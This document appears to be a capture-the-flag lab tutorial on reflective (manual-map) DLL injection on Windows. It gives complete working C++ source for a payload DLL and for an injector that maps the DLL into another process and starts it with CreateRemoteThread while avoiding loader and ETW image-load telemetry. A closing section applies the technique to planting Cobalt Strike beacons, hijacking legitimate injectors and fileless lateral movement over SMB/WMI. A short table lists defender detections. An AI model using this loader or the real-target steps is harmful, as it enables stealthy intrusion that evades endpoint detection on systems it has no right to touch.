# #16 — Reflective / Manual-Map DLL Injection

**Difficulty:** HARD. This is where you stop using the Windows DLL loader entirely.

## What is this attack?

**Load a DLL into another process without ever calling `LoadLibrary`.** The DLL exists only in memory — never written to disk inside the target, never seen by image-load callbacks, never listed in `/proc/.../modules` equivalent.

Published 2008 by Stephen Fewer. Core technique behind Meterpreter, Cobalt Strike beacons, Empire, and most modern C2 implants.

## Why it works

Normal `LoadLibrary(path)` flow:
1. Open the file on disk → ETW `Microsoft-Windows-Kernel-File` event
2. Map it as a section → ETW `Microsoft-Windows-Kernel-ImageLoad` event
3. Loader walks IAT, resolves imports → DLL now in PEB's `LDR_DATA_TABLE_ENTRY`
4. Loader calls `DllMain`

**Every one of those steps is logged somewhere.** EDR hooks every one.

Reflective / manual-map replaces the loader itself:
1. Attacker reads DLL **bytes** (not a file open on target — attacker-side)
2. `VirtualAllocEx` enough space in target for a mapped image
3. Attacker copies PE headers + each section at the right virtual offset
4. Attacker applies base relocations (adjusts internal pointers to the new base)
5. Attacker resolves imports (looks them up on attacker side, writes to target's IAT — `kernel32.dll` is at the same address in all processes)
6. Attacker calls a named export via `CreateRemoteThread`

The DLL runs. **No `LoadLibrary` ever executed inside the target. No file was opened by the target. No ETW image-load event fired. The DLL is NOT in the PEB module list.**

Walking `GetModuleHandle("your_dll_name")` from inside the host returns NULL — your DLL is invisible to the OS inventory, even though it's running.

## When attackers use this

Every modern C2 implant uses this or a variant:
- Cobalt Strike's beacon stager
- Meterpreter's `metsrv.dll`
- Sliver, Mythic, Havoc payloads
- APT41, APT28, FIN7 custom loaders

If a defender's EDR relies on `ImageLoad` ETW events to inventory loaded modules, this bypasses it entirely.

## Tools you need

Same as #13.

## Step-by-step

### Step 1 — Write a reflective-friendly DLL (no CRT dependencies)

Because we're going to call an exported function directly (not through `_DllMainCRTStartup`), the C runtime isn't initialized. **No `fopen`, no `printf`, no `malloc`.** Use raw Win32 APIs only.

Save as `flag_reader16.cpp`:

```cpp
#include <windows.h>

static const unsigned char NEEDLE[] = {
    'M',0,'V',0,'T',0,'C',0,'{',0,'v',0,'1',0,'6',0,'_',0
};
#define NL (sizeof(NEEDLE))

static int my_memcmp(const void* a, const void* b, SIZE_T n) {
    const unsigned char* x = (const unsigned char*)a;
    const unsigned char* y = (const unsigned char*)b;
    for (SIZE_T i = 0; i < n; ++i) if (x[i] != y[i]) return x[i] - y[i];
    return 0;
}

static SIZE_T my_strlen(const char* s) { SIZE_T n=0; while (s[n]) n++; return n; }

static void write_line(HANDLE h, const char* s) {
    DWORD w;
    WriteFile(h, s, (DWORD)my_strlen(s), &w, nullptr);
    WriteFile(h, "\r\n", 2, &w, nullptr);
}

extern "C" __declspec(dllexport) DWORD WINAPI PayloadEntry(LPVOID) {
    HANDLE h = CreateFileA("C:\\loot\\flag16.txt", GENERIC_WRITE, 0,
                           nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return 1;

    write_line(h, "[*] PayloadEntry fired (no LoadLibrary used)");

    MEMORY_BASIC_INFORMATION mbi;
    unsigned char* a = 0;
    while (VirtualQuery(a, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && !(mbi.Protect & (PAGE_NOACCESS|PAGE_GUARD))
            && mbi.RegionSize < 0x40000000) {
            __try {
                unsigned char* b = (unsigned char*)mbi.BaseAddress;
                for (SIZE_T i = 0; i + NL < mbi.RegionSize; ++i) {
                    if (my_memcmp(b+i, NEEDLE, NL) == 0) {
                        char buf[256]; SIZE_T w = 0;
                        for (SIZE_T k=0; k+1<256; ++k) {
                            unsigned short wc = b[i+k*2] | (b[i+k*2+1]<<8);
                            if (wc < 32 || wc > 126) break;
                            buf[w++] = (char)wc;
                            if (wc == '}') break;
                        }
                        buf[w] = 0;
                        if (buf[w-1] == '}') {
                            write_line(h, buf);
                            CloseHandle(h);
                            return 0;
                        }
                    }
                }
            } __except(EXCEPTION_EXECUTE_HANDLER) {}
        }
        a = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(h);
    return 2;
}

BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) { return TRUE; }
```

**The export is called `PayloadEntry`** — the injector will look up this name in the DLL's export table and call it directly.

### Step 2 — Write the manual-map injector

Save as `injector16.cpp`. The structure:

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static BYTE* read_file(const char* p, DWORD* sz) {
    HANDLE h = CreateFileA(p, GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, 0, nullptr);
    *sz = GetFileSize(h, nullptr);
    BYTE* b = (BYTE*)malloc(*sz);
    DWORD r; ReadFile(h, b, *sz, &r, nullptr);
    CloseHandle(h);
    return b;
}

static DWORD find_export_rva(BYTE* img, const char* name) {
    auto dh = (IMAGE_DOS_HEADER*)img;
    auto nh = (IMAGE_NT_HEADERS*)(img + dh->e_lfanew);
    DWORD rva = nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto ed = (IMAGE_EXPORT_DIRECTORY*)(img + rva);
    DWORD* nms = (DWORD*)(img + ed->AddressOfNames);
    WORD*  ord = (WORD*) (img + ed->AddressOfNameOrdinals);
    DWORD* fn  = (DWORD*)(img + ed->AddressOfFunctions);
    for (DWORD i = 0; i < ed->NumberOfNames; ++i)
        if (strcmp((char*)(img + nms[i]), name) == 0)
            return fn[ord[i]];
    return 0;
}

int main(int argc, char** argv) {
    DWORD pid = atoi(argv[1]);
    DWORD sz; BYTE* file = read_file(argv[2], &sz);

    auto dh = (IMAGE_DOS_HEADER*)file;
    auto nh = (IMAGE_NT_HEADERS*)(file + dh->e_lfanew);
    DWORD imgSize = nh->OptionalHeader.SizeOfImage;
    ULONGLONG prefBase = nh->OptionalHeader.ImageBase;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remoteBase = VirtualAllocEx(hProc, nullptr, imgSize,
                                       MEM_COMMIT|MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    ULONGLONG delta = (ULONGLONG)remoteBase - prefBase;

    // Stage locally first (simpler than reaching into target repeatedly)
    BYTE* local = (BYTE*)VirtualAlloc(nullptr, imgSize,
                                      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    memset(local, 0, imgSize);
    memcpy(local, file, nh->OptionalHeader.SizeOfHeaders);

    // Copy sections to their VA offsets
    auto nhLocal = (IMAGE_NT_HEADERS*)(local + dh->e_lfanew);
    auto sh = IMAGE_FIRST_SECTION(nhLocal);
    for (int i = 0; i < nhLocal->FileHeader.NumberOfSections; ++i)
        if (sh[i].SizeOfRawData)
            memcpy(local + sh[i].VirtualAddress,
                   file  + sh[i].PointerToRawData,
                   sh[i].SizeOfRawData);

    // Apply base relocations
    if (delta) {
        auto& reloc = nhLocal->OptionalHeader
                      .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        auto r = (IMAGE_BASE_RELOCATION*)(local + reloc.VirtualAddress);
        while (r->VirtualAddress) {
            DWORD cnt = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
            WORD* e = (WORD*)(r + 1);
            for (DWORD k = 0; k < cnt; ++k)
                if ((e[k] >> 12) == IMAGE_REL_BASED_DIR64)
                    *(ULONGLONG*)(local + r->VirtualAddress + (e[k] & 0xFFF)) += delta;
            r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
        }
    }

    // Resolve imports (resolve from attacker-side kernel32, same base)
    auto& imp = nhLocal->OptionalHeader
                .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto iid = (IMAGE_IMPORT_DESCRIPTOR*)(local + imp.VirtualAddress);
    while (iid->Name) {
        HMODULE mod = LoadLibraryA((char*)(local + iid->Name));
        auto oit = (IMAGE_THUNK_DATA*)(local + iid->OriginalFirstThunk);
        auto it  = (IMAGE_THUNK_DATA*)(local + iid->FirstThunk);
        while (oit->u1.AddressOfData) {
            auto iin = (IMAGE_IMPORT_BY_NAME*)(local + oit->u1.AddressOfData);
            it->u1.Function = (ULONGLONG)GetProcAddress(mod, iin->Name);
            oit++; it++;
        }
        iid++;
    }

    // Blast the mapped image into target in one write
    WriteProcessMemory(hProc, remoteBase, local, imgSize, nullptr);

    // Look up PayloadEntry and fire it
    DWORD entryRva = find_export_rva(local, "PayloadEntry");
    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)((BYTE*)remoteBase + entryRva),
        nullptr, 0, nullptr);
    WaitForSingleObject(hT, 5000);

    CloseHandle(hT); CloseHandle(hProc);
    return 0;
}
```

### Step 3 — Build and run

```bash
cl /LD /EHsc /O2 /nologo flag_reader16.cpp /link /OUT:flag_reader16.dll
cl /EHsc /O2 /nologo injector16.cpp /link /OUT:injector16.exe
injector16.exe 6944 C:\full\path\to\flag_reader16.dll
```

### Step 4 — Read the flag

```powershell
type C:\loot\flag16.txt
```

## How to apply this to a real target

### Lifting a Cobalt Strike beacon in-memory

Cobalt Strike's `beacon.dll` is a reflective DLL. Its `genStageless` option produces raw shellcode that includes a reflective loader. Drop that shellcode into any process via our injector and you've just planted a beacon.

### Supply-chain style: hijack a legitimate injector

Many legitimate programs ship with injectors (anti-cheat, DRM, performance tools). Steal theirs; swap their payload for yours.

### Fileless lateral movement

Push the DLL bytes over SMB admin shares into a WMI event, call `GetObject("winmgmts:...").Create()` to spawn `rundll32`, then manual-map inside — the DLL is never written to the victim's disk.

## How defenders fix this

| Detection | What catches it |
|---|---|
| **ETW `Microsoft-Windows-Threat-Intelligence`** (Win10 1703+) | Reports `VirtualAllocEx` with RWX from untrusted callers |
| **PsSetCreateThreadNotifyRoutine** callback | Kernel-mode callback fires for every `CreateRemoteThread` with a non-image address — your `PayloadEntry` lives outside any mapped image on disk |
| **Memory scanning (YARA + hollowfind)** | Scans every process for sections marked RWX with no mapped file backing — the smoking gun |
| **Code Integrity Guard** | Blocks `VirtualAlloc(RWX)` entirely for CIG-opted-in processes |

Modern defenders use **PE Sieve** (hasherezade) to detect manually-mapped DLLs by comparing in-memory sections against on-disk originals.

## Flag captured

```
MVTC{v16_ref_████████████████████}
```
